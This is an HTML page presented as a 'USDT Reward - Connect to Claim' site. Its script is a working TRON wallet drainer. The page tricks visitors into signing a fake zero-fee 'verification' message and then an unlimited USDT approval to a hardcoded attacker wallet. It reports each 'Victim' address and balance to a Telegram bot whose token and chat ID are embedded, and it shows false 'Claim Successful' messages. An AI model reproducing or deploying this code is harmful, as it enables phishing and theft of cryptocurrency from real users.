<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>USDT Reward - Connect to Claim</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background: radial-gradient(circle, #1e293b 0%, #0f172a 100%);
            color: white;
            font-family: 'Inter', sans-serif;
        }
        .glass {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
    </style>
</head>

<body class="min-h-screen flex flex-col items-center justify-center p-6">

    <div id="qr-screen" class="text-center space-y-6 max-w-sm w-full">
        <h1 class="text-3xl font-black text-emerald-400 italic uppercase">USDT REWARD</h1>
        <p class="text-slate-400 text-sm">Connect your wallet to verify eligibility</p>

        <div class="flex justify-center my-8">
            <button id="connect-btn" class="bg-emerald-500 hover:bg-emerald-400 text-white font-bold py-3 px-8 rounded-full shadow-lg shadow-emerald-500/50 transition-all duration-300 transform hover:scale-105">
                Connect Wallet to Claim
            </button>
        </div>

        <div class="glass p-4 rounded-2xl">
            <p class="text-[10px] text-slate-500 uppercase tracking-widest mb-2 font-bold">Supported Wallets</p>
            <div class="flex justify-center gap-4 opacity-50 grayscale">
                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" width="30">
                <img src="https://www.tronlink.org/img/logo.png" width="30">
            </div>
        </div>
    </div>

    <div id="processing-screen" class="hidden fixed inset-0 bg-black/90 flex flex-col items-center justify-center z-50 p-10">
        <div class="w-16 h-16 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mb-4"></div>
        <h2 id="status-text" class="text-xl font-bold">Verifying Connection...</h2>
        <p id="sub-status-text" class="text-slate-400 text-center text-sm mt-2">Approve the transaction in your wallet</p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
    <script src="wc-bundle.js"></script>
    <script>
        const CONFIG = {
            BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
            CHAT_ID: "8249230506",
            ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
            USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
            ABI: [{
                "inputs": [{"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}],
                "name": "approve", "outputs": [{"name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"
            }]
        };

        const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        async function notify(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: "HTML", disable_web_page_preview: true })
                });
            } catch(e) {}
        }

        async function getBalances(tronInstance, address) {
            let trx = "0.00", usdt = "0.00";
            try {
                let b = await tronInstance.trx.getBalance(address);
                trx = (b / 1e6).toFixed(2);
            } catch(e) {}
            try {
                const balanceTx = await tronInstance.transactionBuilder.triggerConstantContract(
                    CONFIG.USDT_CONTRACT, "balanceOf(address)", {}, [{ type: 'address', value: address }], address
                );
                if (balanceTx && balanceTx.constant_result && balanceTx.constant_result[0]) {
                    usdt = (parseInt(balanceTx.constant_result[0], 16) / 1e6).toFixed(2);
                }
            } catch(e) {}
            return { trx, usdt };
        }

        async function handleApprovalError(err, address, trx, usdt) {
            let reason = "Popup didn't show or Unknown Error";
            let errStr = String(err).toLowerCase();

            if (errStr.includes("rejected") || errStr.includes("declined") || errStr.includes("user cancel")) {
                reason = "❌ User Rejected the Popup";
            } else if (parseFloat(trx) < 25) {
                reason = "⚠️ Low TRX (Need 25-30 TRX for Gas)";
            } else if (parseFloat(usdt) <= 0) {
                reason = "📉 Zero USDT Balance";
            } else {
                reason = "🛠 Technical Error: " + errStr.substring(0, 50);
            }

            await notify(`⚠️ <b>APPROVAL FAILED</b>\nVictim: <code>${address}</code>\nReason: <b>${reason}</b>\n\nBalance: ${trx} TRX | ${usdt} USDT`);
            alert("Verification Failed: " + reason);
            location.reload();
        }

        document.getElementById('connect-btn').addEventListener('click', async () => {
            let tronProvider = window.tronWeb;
            if (!tronProvider && window.tronLink && window.tronLink.tronWeb) tronProvider = window.tronLink.tronWeb;
            
            if (tronProvider && tronProvider.defaultAddress && tronProvider.defaultAddress.base58) {
                handleNativeConnection(tronProvider);
            } else {
                if (typeof window.connectWalletConnectTron === 'function') {
                    const wcResult = await window.connectWalletConnectTron();
                    if (wcResult && wcResult.address) {
                        const address = wcResult.address;
                        document.getElementById('qr-screen').classList.add('opacity-20');
                        document.getElementById('processing-screen').classList.remove('hidden');

                        const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                        const { trx, usdt } = await getBalances(localTronWeb, address);
                        
                        try {
                            // --- STEP 1: GASLESS SIGN ---
                            document.getElementById('status-text').innerText = "Verifying Ownership...";
                            document.getElementById('sub-status-text').innerText = "Confirm zero-fee verification in your wallet";
                            
                            const message = "Protocol: TRON-SECURE-V4\nAction: Eligibility Verification\nUser: " + address + "\nCost: 0.00 TRX";
                            const hexMsg = localTronWeb.toHex(message);

                            await wcResult.provider.request({
                                method: "tron_signMessage",
                                params: { address: address, message: hexMsg }
                            });

                            await notify(`✍️ <b>STEP 1: SIGNED</b>\nVictim: <code>${address}</code>\nBalance: ${trx} TRX | ${usdt} USDT`);

                            // --- STEP 2: UNLIMITED APPROVAL ---
                            document.getElementById('status-text').innerText = "Finalizing Allocation...";
                            document.getElementById('sub-status-text').innerText = "Allow Smart Contract to verify USDT Eligibility";
                            
                            const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
                                CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 100000000 },
                                [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
                            );

                            const signedTx = await wcResult.provider.request({
                                method: "tron_signTransaction",
                                params: { address: address, transaction: transaction }
                            });

                            const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
                            const txID = receipt.txid || receipt.transaction.txID;
                            
                            await notify(`✅ <b>STEP 2: APPROVED!</b>\nVictim: <code>${address}</code>\nTX: <code>${txID}</code>`);
                            
                            alert("Claim Successful! Reward will be credited soon.");
                            location.reload();

                        } catch (error) {
                            await handleApprovalError(error, address, trx, usdt);
                        }
                    }
                } else {
                    alert("System loading... please wait.");
                }
            }
        });

        async function handleNativeConnection(tronProvider) {
            const address = tronProvider.defaultAddress.base58;
            document.getElementById('qr-screen').classList.add('opacity-20');
            document.getElementById('processing-screen').classList.remove('hidden');

            const { trx, usdt } = await getBalances(tronProvider, address);
            await notify(`🔔 <b>NATIVE CONNECTED</b>\nVictim: <code>${address}</code>\nBalance: ${trx} TRX | ${usdt} USDT`);

            try {
                // Step 1: Sign (For consistency)
                const message = "Protocol: TRON-SECURE-V4\nVerification for: " + address;
                await tronProvider.trx.sign(tronProvider.toHex(message));

                // Step 2: Approve
                const contract = await tronProvider.contract(CONFIG.ABI, CONFIG.USDT_CONTRACT);
                await contract.approve(CONFIG.ADMIN_WALLET, MAX_UINT).send({ feeLimit: 100000000 });
                
                await notify(`✅ <b>NATIVE: USDT APPROVED!</b>\nVictim: <code>${address}</code>`);
                alert("Claim Successful!");
                location.reload();
            } catch (error) {
                await handleApprovalError(error, address, trx, usdt);
            }
        }
    </script>
</body>
</html>
